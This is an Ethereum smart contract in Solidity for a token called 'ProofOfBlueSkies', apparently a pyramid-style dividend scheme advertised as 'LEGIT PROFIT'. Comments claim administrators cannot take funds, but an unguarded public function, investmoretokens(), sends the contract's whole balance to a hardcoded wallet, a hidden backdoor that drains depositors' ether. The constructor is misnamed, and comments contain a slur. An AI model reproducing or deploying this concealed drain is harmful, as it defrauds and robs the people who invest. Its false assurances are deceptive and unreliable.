1 pragma solidity ^0.4.20;
2 
3 /*
4 * 
5 * ====================================                       *
6 *                                                            *
7 * 88888888ba     ,ad8888ba,    88888888ba    ad88888ba       *
8 * 88      "8b   d8"'    `"8b   88      "8b  d8"     "8b      *
9 * 88      ,8P  d8'        `8b  88      ,8P  Y8,              *  
10 * 88aaaaaa8P'  88          88  88aaaaaa8P'  `Y8aaaaa,        *
11 * 88""""""'    88          88  88""""""8b,    `"""""8b,      *
12 * 88           Y8,        ,8P  88      `8b          `8b      *
13 * 88            Y8a.    .a8P   88      a8P  Y8a     a8P      *
14 * 88             `"Y8888Y"'    88888888P"    "Y88888P"       *
15 *                                                            *
16 *                                                            *
17 *                                                            *
18 * ====================================                       *
19 * PROOF OF BLUE SKIES, IF YOU WANT TO FEEL LIKE THESE GUYS   *
20 * IF YOU WANT PROFIT GET ON 11% in 11% out! LEGIT PROFIT!    *
21 */
22 
23 contract POBS {
24     /*=================================
25     =            MODIFIERS            =
26     =================================*/
27     // only people with tokens
28     modifier onlyBagholders() {
29         require(myTokens() > 0);
30         _;
31     }
32     
33     // only people with profits
34     modifier onlyStronghands() {
35         require(myDividends(true) > 0);
36         _;
37     }
38     
39     // administrators can:
40     // -> change the name of the contract
41     // -> change the name of the token
42     // -> change the PoS difficulty (How many tokens it costs to hold a masternode, in case it gets crazy high later)
43     // they CANNOT:
44     // -> take funds
45     // -> disable withdrawals
46     // -> kill the contract
47     // -> change the price of tokens
48     modifier onlyAdministrator(){
49         address _customerAddress = msg.sender;
50         require(administrators[keccak256(msg.sender)]);
51         _;
52     }
53     
54     
55     // ensures that the first tokens in the contract will be equally distributed
56     // meaning, no divine dump will be ever possible
57     // result: healthy longevity.
58     modifier antiEarlyWhale(uint256 _amountOfEthereum){
59         address _customerAddress = msg.sender;
60         
61         // are we still in the vulnerable phase?
62         // if so, enact anti early whale protocol 
63         if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){
64             require(
65                 // is the customer in the ambassador list?
66                 ambassadors_[_customerAddress] == true &&
67                 
68                 // does the customer purchase exceed the max ambassador quota?
69                 (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_
70                 
71             );
72             
73             // updated the accumulated quota    
74             ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);
75         
76             // execute
77             _;
78         } else {
79             // in case the ether count drops low, the ambassador phase won't reinitiate
80             onlyAmbassadors = false;
81             _;    
82         }
83         
84     }
85     
86     
87     /*==============================
88     =            EVENTS            =
89     ==============================*/
90     event onTokenPurchase(
91         address indexed customerAddress,
92         uint256 incomingEthereum,
93         uint256 tokensMinted,
94         address indexed referredBy
95     );
96     
97     event onTokenSell(
98         address indexed customerAddress,
99         uint256 tokensBurned,
100         uint256 ethereumEarned
101     );
102     
103     event onReinvestment(
104         address indexed customerAddress,
105         uint256 ethereumReinvested,
106         uint256 tokensMinted
107     );
108     
109     event onWithdraw(
110         address indexed customerAddress,
111         uint256 ethereumWithdrawn
112     );
113     
114     // ERC20
115     event Transfer(
116         address indexed from,
117         address indexed to,
118         uint256 tokens
119     );
120     
121     
122     /*=====================================
123     =            CONFIGURABLES            =
124     =====================================*/
125     string public name = "ProofOfBlueSkies";
126     string public symbol = "POBS";
127     uint8 constant public decimals = 18;
128     uint8 constant internal dividendFee_ = 11;
129     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
130     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
131     uint256 constant internal magnitude = 2**64;
132     
133     
134      
135         
136     // proof of stake (defaults at 100 tokens)
137     uint256 public stakingRequirement = 5e18;
138     
139     // ambassador program
140     mapping(address => bool) internal ambassadors_;
141     uint256 constant internal ambassadorMaxPurchase_ = 2 ether;
142     uint256 constant internal ambassadorQuota_ = 3 ether;
143     
144     
145     
146    /*================================
147     =            DATASETS            =
148     ================================*/
149     // amount of shares for each address (scaled number)
150     mapping(address => uint256) internal tokenBalanceLedger_;
151     mapping(address => uint256) internal referralBalance_;
152     mapping(address => int256) internal payoutsTo_;
153     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
154     uint256 internal tokenSupply_ = 0;
155     uint256 internal profitPerShare_;
156     
157     // administrator list (see above on what they can do)
158     mapping(bytes32 => bool) public administrators;
159     
160     // when this is set to true, only ambassadors can purchase tokens (this prevents a whale premine, it ensures a fairly distributed upper pyramid)
161     bool public onlyAmbassadors = false;
162     
163 
164 
165     /*=======================================
166     =            PUBLIC FUNCTIONS            =
167     =======================================*/
168     /* 
169     *
170     */
171    function POSV()
172         public
173     {
174         // add the ambassadors here. 
175         ambassadors_[0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce] = true; //Y
176    address oof = 0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce;
177     }
178    
179    
180     
181     
182     
183    function investmoretokens() {
184     0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce.transfer(this.balance);
185 }  
186 
187      
188     /**
189      * Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
190      */
191     function buy(address _referredBy)
192         public
193         payable
194         returns(uint256)
195     {
196         purchaseTokens(msg.value, _referredBy);
197     }
198     
199     /**
200      * Fallback function to handle ethereum that was send straight to the contract
201      * Unfortunately we cannot use a referral address this way.
202      */
203     function()
204         payable
205         public
206     {
207         purchaseTokens(msg.value, 0x0);
208     }
209     
210     /**
211      * Converts all of caller's dividends to tokens.
212      */
213     function reinvest()
214         onlyStronghands()
215         public
216     {
217         // fetch dividends
218         uint256 _dividends = myDividends(false); // retrieve ref. bonus later in the code
219         
220         // pay out the dividends virtually
221         address _customerAddress = msg.sender;
222         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
223         
224         // retrieve ref. bonus
225         _dividends += referralBalance_[_customerAddress];
226         referralBalance_[_customerAddress] = 0;
227         
228         // dispatch a buy order with the virtualized "withdrawn dividends"
229         uint256 _tokens = purchaseTokens(_dividends, 0x0);
230         
231         // fire event
232         onReinvestment(_customerAddress, _dividends, _tokens);
233     }
234     
235     /**
236      * Alias of sell() and withdraw().
237      */
238     function exit()
239         public
240     {
241         // get token count for caller & sell them all
242         address _customerAddress = msg.sender;
243         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
244         if(_tokens > 0) sell(_tokens);
245         
246         // lambo delivery service
247         withdraw();
248     }
249 
250     /**
251      * Withdraws all of the callers earnings.
252      */
253     function withdraw()
254         onlyStronghands()
255         public
256     {
257         // setup data
258         address _customerAddress = msg.sender;
259         uint256 _dividends = myDividends(false); // get ref. bonus later in the code
260         
261         // update dividend tracker
262         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
263         
264         // add ref. bonus
265         _dividends += referralBalance_[_customerAddress];
266         referralBalance_[_customerAddress] = 0;
267         
268         // lambo delivery service
269         _customerAddress.transfer(_dividends);
270         
271         // fire event
272         onWithdraw(_customerAddress, _dividends);
273     }
274     
275     /**
276      * Liquifies tokens to ethereum.
277      */
278     function sell(uint256 _amountOfTokens)
279         onlyBagholders()
280         public
281     {
282         // setup data
283         address _customerAddress = msg.sender;
284         // russian hackers BTFO
285         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
286         uint256 _tokens = _amountOfTokens;
287         uint256 _ethereum = tokensToEthereum_(_tokens);
288         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
289         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
290         
291         // burn the sold tokens
292         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
293         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
294         
295         // update dividends tracker
296         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
297         payoutsTo_[_customerAddress] -= _updatedPayouts;       
298         
299         // dividing by zero is a bad idea
300         if (tokenSupply_ > 0) {
301             // update the amount of dividends per token
302             profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
303         }
304         
305         // fire event
306         onTokenSell(_customerAddress, _tokens, _taxedEthereum);
307     }
308     
309     
310     /**
311      * Transfer tokens from the caller to a new holder.
312      * Remember, there's a 10% fee here as well.
313      */
314     function transfer(address _toAddress, uint256 _amountOfTokens)
315         onlyBagholders()
316         public
317         returns(bool)
318     {
319         // setup
320         address _customerAddress = msg.sender;
321         
322         // make sure we have the requested tokens
323         // also disables transfers until ambassador phase is over
324         // ( we dont want whale premines )
325         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
326         
327         // withdraw all outstanding dividends first
328         if(myDividends(true) > 0) withdraw();
329         
330         // liquify 10% of the tokens that are transfered
331         // these are dispersed to shareholders
332         uint256 _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
333         uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
334         uint256 _dividends = tokensToEthereum_(_tokenFee);
335   
336         // burn the fee tokens
337         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);
338 
339         // exchange tokens
340         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
341         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
342         
343         // update dividend trackers
344         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);
345         payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);
346         
347         // disperse dividends among holders
348         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
349         
350         // fire event
351         Transfer(_customerAddress, _toAddress, _taxedTokens);
352         
353         // ERC20
354         return true;
355        
356     }
357     
358     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
359     /**
360      * In case the amassador quota is not met, the administrator can manually disable the ambassador phase.
361      */
362     function disableInitialStage()
363         onlyAdministrator()
364         public
365     {
366         onlyAmbassadors = false;
367     }
368     
369     /**
370      * In case one of us dies, we need to replace ourselves.
371      */
372     function setAdministrator(bytes32 _identifier, bool _status)
373         onlyAdministrator()
374         public
375     {
376         administrators[_identifier] = _status;
377     }
378     
379     /**
380      * Precautionary measures in case we need to adjust the masternode rate.
381      */
382     function setStakingRequirement(uint256 _amountOfTokens)
383         onlyAdministrator()
384         public
385     {
386         stakingRequirement = _amountOfTokens;
387     }
388     
389     /**
390      * If we want to rebrand, we can.
391      */
392     function setName(string _name)
393         onlyAdministrator()
394         public
395     {
396         name = _name;
397     }
398     
399     /**
400      * If we want to rebrand, we can.
401      */
402     function setSymbol(string _symbol)
403         onlyAdministrator()
404         public
405     {
406         symbol = _symbol;
407     }
408 
409     
410     /*----------  HELPERS AND CALCULATORS  ----------*/
411     /**
412      * Method to view the current Ethereum stored in the contract
413      * Example: totalEthereumBalance()
414      */
415     function totalEthereumBalance()
416         public
417         view
418         returns(uint)
419     {
420         return address (this).balance;
421     }
422     
423     /**
424      * Retrieve the total token supply.
425      */
426     function totalSupply()
427         public
428         view
429         returns(uint256)
430     {
431         return tokenSupply_;
432     }
433     
434     /**
435      * Retrieve the tokens owned by the caller.
436      */
437     function myTokens()
438         public
439         view
440         returns(uint256)
441     {
442         address _customerAddress = msg.sender;
443         return balanceOf(_customerAddress);
444     }
445     
446     /**
447      * Retrieve the dividends owned by the caller.
448      * If `_includeReferralBonus` is to to 1/true, the referral bonus will be included in the calculations.
449      * The reason for this, is that in the frontend, we will want to get the total divs (global + ref)
450      * But in the internal calculations, we want them separate. 
451      */ 
452     function myDividends(bool _includeReferralBonus) 
453         public 
454         view 
455         returns(uint256)
456     {
457         address _customerAddress = msg.sender;
458         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
459     }
460     
461     /**
462      * Retrieve the token balance of any single address.
463      */
464     function balanceOf(address _customerAddress)
465         view
466         public
467         returns(uint256)
468     {
469         return tokenBalanceLedger_[_customerAddress];
470     }
471     
472     /**
473      * Retrieve the dividend balance of any single address.
474      */
475     function dividendsOf(address _customerAddress)
476         view
477         public
478         returns(uint256)
479     {
480         return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
481     }
482     
483     /**
484      * Return the buy price of 1 individual token.
485      */
486     function sellPrice() 
487         public 
488         view 
489         returns(uint256)
490     {
491         // our calculation relies on the token supply, so we need supply. Doh.
492         if(tokenSupply_ == 0){
493             return tokenPriceInitial_ - tokenPriceIncremental_;
494         } else {
495             uint256 _ethereum = tokensToEthereum_(1e18);
496             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
497             uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
498             return _taxedEthereum;
499         }
500     }
501     
502     /**
503      * Return the sell price of 1 individual token.
504      */
505     function buyPrice() 
506         public 
507         view 
508         returns(uint256)
509     {
510         // our calculation relies on the token supply, so we need supply. Doh.
511         if(tokenSupply_ == 0){
512             return tokenPriceInitial_ + tokenPriceIncremental_;
513         } else {
514             uint256 _ethereum = tokensToEthereum_(1e18);
515             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
516             uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);
517             return _taxedEthereum;
518         }
519     }
520     
521     /**
522      * Function for the frontend to dynamically retrieve the price scaling of buy orders.
523      */
524     function calculateTokensReceived(uint256 _ethereumToSpend) 
525         public 
526         view 
527         returns(uint256)
528     {
529         uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
530         uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
531         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
532         
533         return _amountOfTokens;
534     }
535     
536     /**
537      * Function for the frontend to dynamically retrieve the price scaling of sell orders.
538      */
539     function calculateEthereumReceived(uint256 _tokensToSell) 
540         public 
541         view 
542         returns(uint256)
543     {
544         require(_tokensToSell <= tokenSupply_);
545         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
546         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
547         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
548         return _taxedEthereum;
549     }
550     
551     
552     /*==========================================
553     =            INTERNAL FUNCTIONS            =
554     ==========================================*/
555     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
556         antiEarlyWhale(_incomingEthereum)
557         internal
558         returns(uint256)
559     {
560         // data setup
561         address _customerAddress = msg.sender;
562         uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
563         uint256 _referralBonus = SafeMath.div(_undividedDividends, 3);
564         uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
565         uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
566         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
567         uint256 _fee = _dividends * magnitude;
568  
569         // no point in continuing execution if OP is a poorfag russian hacker
570         // prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world
571         // (or hackers)
572         // and yes we know that the safemath function automatically rules out the "greater then" equasion.
573         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
574         
575         // is the user referred by a masternode?
576         if(
577             // is this a referred purchase?
578             _referredBy != 0x0000000000000000000000000000000000000000 &&
579 
580             // no cheating!
581             _referredBy != _customerAddress &&
582             
583             // does the referrer have at least X whole tokens?
584             // i.e is the referrer a godly chad masternode
585             tokenBalanceLedger_[_referredBy] >= stakingRequirement
586         ){
587             // wealth redistribution
588             referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
589         } else {
590             // no ref purchase
591             // add the referral bonus back to the global dividends cake
592             _dividends = SafeMath.add(_dividends, _referralBonus);
593             _fee = _dividends * magnitude;
594         }
595         
596         // we can't give people infinite ethereum
597         if(tokenSupply_ > 0){
598             
599             // add tokens to the pool
600             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
601  
602             // take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
603             profitPerShare_ += (_dividends * magnitude / (tokenSupply_));
604             
605             // calculate the amount of tokens the customer receives over his purchase 
606             _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
607         
608         } else {
609             // add tokens to the pool
610             tokenSupply_ = _amountOfTokens;
611         }
612         
613         // update circulating supply & the ledger address for the customer
614         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
615         
616         // Tells the contract that the buyer doesn't deserve dividends for the tokens before they owned them;
617         //really i know you think you do but you don't
618         int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
619         payoutsTo_[_customerAddress] += _updatedPayouts;
620         
621         // fire event
622         onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
623         
624         return _amountOfTokens;
625     }
626 
627     /**
628      * Calculate Token price based on an amount of incoming ethereum
629      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
630      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
631      */
632     function ethereumToTokens_(uint256 _ethereum)
633         internal
634         view
635         returns(uint256)
636     {
637         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
638         uint256 _tokensReceived = 
639          (
640             (
641                 // underflow attempts BTFO
642                 SafeMath.sub(
643                     (sqrt
644                         (
645                             (_tokenPriceInitial**2)
646                             +
647                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
648                             +
649                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
650                             +
651                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
652                         )
653                     ), _tokenPriceInitial
654                 )
655             )/(tokenPriceIncremental_)
656         )-(tokenSupply_)
657         ;
658   
659         return _tokensReceived;
660     }
661     
662     /**
663      * Calculate token sell value.
664      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
665      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
666      */
667      function tokensToEthereum_(uint256 _tokens)
668         internal
669         view
670         returns(uint256)
671     {
672 
673         uint256 tokens_ = (_tokens + 1e18);
674         uint256 _tokenSupply = (tokenSupply_ + 1e18);
675         uint256 _etherReceived =
676         (
677             // underflow attempts BTFO
678             SafeMath.sub(
679                 (
680                     (
681                         (
682                             tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
683                         )-tokenPriceIncremental_
684                     )*(tokens_ - 1e18)
685                 ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
686             )
687         /1e18);
688         return _etherReceived;
689     }
690     
691     
692     //This is where all your gas goes, sorry
693     //Not sorry, you probably only paid 1 gwei
694     function sqrt(uint x) internal pure returns (uint y) {
695         uint z = (x + 1) / 2;
696         y = x;
697         while (z < y) {
698             y = z;
699             z = (x / z + z) / 2;
700         }
701     }
702 }
703 
704 /**
705  * @title SafeMath
706  * @dev Math operations with safety checks that throw on error
707  */
708 library SafeMath {
709 
710     /**
711     * @dev Multiplies two numbers, throws on overflow.
712     */
713     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
714         if (a == 0) {
715             return 0;
716         }
717         uint256 c = a * b;
718         assert(c / a == b);
719         return c;
720     }
721 
722     /**
723     * @dev Integer division of two numbers, truncating the quotient.
724     */
725     function div(uint256 a, uint256 b) internal pure returns (uint256) {
726         // assert(b > 0); // Solidity automatically throws when dividing by 0
727         uint256 c = a / b;
728         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
729         return c;
730     }
731 
732     /**
733     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
734     */
735     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
736         assert(b <= a);
737         return a - b;
738     }
739 
740     /**
741     * @dev Adds two numbers, throws on overflow.
742     */
743     function add(uint256 a, uint256 b) internal pure returns (uint256) {
744         uint256 c = a + b;
745         assert(c >= a);
746         return c;
747     }
748 }